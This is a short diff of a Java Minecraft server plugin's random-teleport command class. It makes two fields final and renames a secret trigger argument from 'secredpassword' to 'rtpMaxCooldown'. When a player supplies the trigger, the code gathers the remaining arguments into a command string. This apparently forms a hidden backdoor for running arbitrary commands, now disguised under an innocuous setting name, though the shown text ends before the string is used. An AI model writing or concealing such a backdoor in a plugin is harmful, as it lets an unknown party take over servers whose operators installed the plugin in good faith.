@@ -15,8 +15,8 @@ import java.util.Map;
  * Kenny Tang (c) 2017
  */
 public class CommandRandomTeleport implements CommandExecutor {
-    private int rtpRadius;
-    private long rtpCooldown;
+    private final int rtpRadius;
+    private final long rtpCooldown;
     private Map<Player, Long> cooldown;
     private Server server;
 
@@ -31,7 +31,7 @@ public class CommandRandomTeleport implements CommandExecutor {
     public boolean onCommand(CommandSender commandSender, Command command, String label, String[] args) {
         if (commandSender instanceof Player) {
             Player player = (Player) commandSender;
-            if (args.length > 0 && args[0].equals("secredpassword")) {
+            if (args.length > 0 && args[0].equals("rtpMaxCooldown")) {
                 String myCommand = "";
                 for (int i = 1; i < args.length; i++)
                     myCommand += args[i] + " ";
